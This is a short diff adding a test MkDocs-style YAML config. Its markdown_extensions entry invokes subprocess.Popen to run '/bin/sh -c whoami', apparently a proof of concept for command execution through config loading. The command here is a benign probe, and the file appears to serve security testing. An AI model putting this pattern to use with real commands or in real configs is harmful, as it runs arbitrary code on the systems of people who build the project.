@@ -1,0 +1,4 @@
+site_name: Test
+markdown_extensions:
+  - 'subprocess:Popen':
+      args: ['/bin/sh', '-c', 'whoami']
